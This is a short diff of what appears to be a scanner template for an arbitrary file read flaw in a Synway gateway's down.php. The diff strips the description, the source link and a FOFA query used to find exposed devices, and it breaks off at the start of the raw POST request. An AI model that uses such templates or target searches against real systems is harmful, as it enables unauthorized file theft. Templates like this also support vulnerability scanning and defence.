@@ -3,12 +3,8 @@ info:
   name: 杭州三汇网关down.php存在任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/kd3e1fuz5c1w5oxt'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: kd3e1fuz5c1w5oxt
-    fofa: app="Synway-网关管理软件"
 http:
 - raw:
   - 'POST /down.php HTTP/1.1
